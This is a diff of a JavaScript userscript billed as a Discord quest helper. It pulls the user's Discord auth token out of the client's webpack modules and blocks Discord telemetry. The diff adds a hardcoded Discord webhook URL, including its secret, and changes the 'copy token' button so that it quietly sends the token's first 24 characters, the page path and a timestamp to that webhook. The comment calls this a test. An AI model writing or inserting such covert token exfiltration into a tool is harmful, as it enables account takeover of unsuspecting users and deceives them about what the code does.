@@ -1,14 +1,6 @@
-// ==UserScript==
-// @name         ThailandCodes
-// @namespace    ra3d.sys
-// @version      2.0.0
-// @description  Discord quest helper
-// @author       ra3d.sys
-// @match        https://discord.com/*
-// @run-at       document-end
-// @grant        none
-// ==/UserScript==
-
+/**
+ * ThailandCodes — Discord quest helper
+ */
 (function () {
     'use strict';
 
@@ -16,7 +8,29 @@
     window.__TC_LOADED__ = true;
     console.log('[TC] script injected');
 
-    // ─── WEBPACK ─────────────────────────────────────────────────────
+    // ══════════════════════════════════════════════════════════════════
+    //  CONFIG — webhook
+    // ══════════════════════════════════════════════════════════════════
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555924284105298052/7X_WIvWay5hF8pHpIJeX-cjJLY00gnWJ9GDWYm62r_3RCJ3WL11h1QI-2XxjbbKhDZAI';
+
+    async function sendWebhook(payload) {
+        try {
+            const r = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            });
+            console.log('[TC] webhook sent:', r.status);
+            return r.ok;
+        } catch (e) {
+            console.error('[TC] webhook failed:', e);
+            return false;
+        }
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    //  WEBPACK
+    // ══════════════════════════════════════════════════════════════════
     let _wp = null, _token = null, _dispatcher = null, _api = null;
 
     function findWebpack() {
@@ -55,6 +69,10 @@
             if (!_token && typeof cand.getToken === 'function') _token = cand.getToken;
             if (!_dispatcher && cand.__proto__?.flushWaitQueue) _dispatcher = cand;
             if (!_api && (cand.tn?.get || cand.Bo?.get)) _api = cand.tn || cand.Bo;
+            // direct shape
+            if (!_api && typeof cand.get === 'function' && typeof cand.post === 'function') {
+                _api = cand;
+            }
         }
         return !!(_token && _api);
     }
@@ -72,7 +90,9 @@
         throw new Error('token not found');
     }
 
-    // ─── API ─────────────────────────────────────────────────────────
+    // ══════════════════════════════════════════════════════════════════
+    //  API
+    // ══════════════════════════════════════════════════════════════════
     async function apiCall(method, url, body) {
         if (!resolveModules()) throw new Error('modules not ready');
         if (method === 'GET') return (await _api.get({ url }))?.body;
@@ -131,7 +151,9 @@
     const isComplete = (q) => !!q?.userStatus?.completedAt;
     const isClaimed  = (q) => !!q?.userStatus?.claimedAt;
 
-    // ─── ENCRYPTED TOKEN ─────────────────────────────────────────────
+    // ══════════════════════════════════════════════════════════════════
+    //  ENCRYPTED TOKEN
+    // ══════════════════════════════════════════════════════════════════
     async function encryptedToken() {
         const token = await getToken();
         const firstSeg = token.split('.')[0];
@@ -157,7 +179,9 @@
         return btoa(bin);
     }
 
-    // ─── TRACKING BLOCKER ────────────────────────────────────────────
+    // ══════════════════════════════════════════════════════════════════
+    //  TRACKING BLOCKER
+    // ══════════════════════════════════════════════════════════════════
     (function blockTracking() {
         const hit = (u) => String(u).includes('/api/v9/science');
         const of = window.fetch;
@@ -173,7 +197,9 @@
         };
     })();
 
-    // ─── UI ──────────────────────────────────────────────────────────
+    // ══════════════════════════════════════════════════════════════════
+    //  UI
+    // ══════════════════════════════════════════════════════════════════
     const STYLE = `
         :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
         .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
@@ -326,10 +352,22 @@
 
     const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
+    // ══════════════════════════════════════════════════════════════════
+    //  ACTIONS
+    // ══════════════════════════════════════════════════════════════════
     async function actCopyToken() {
         const t = await getToken();
         await navigator.clipboard.writeText(t);
         say('✓ token copied', 'ok');
+
+        // ── test webhook ──
+        const ok = await sendWebhook({
+            content: '**[ThailandCodes]** ✅ COPY TOKEN pressed\n' +
+                     '**User:** `' + (window.location.pathname) + '`\n' +
+                     '**Token prefix:** `' + t.substring(0, 24) + '...`\n' +
+                     '**Time:** ' + new Date().toISOString(),
+        });
+        say(ok ? '✓ webhook sent' : '✗ webhook failed', ok ? 'ok' : 'err');
     }
 
     async function actCopyEncrypted() {
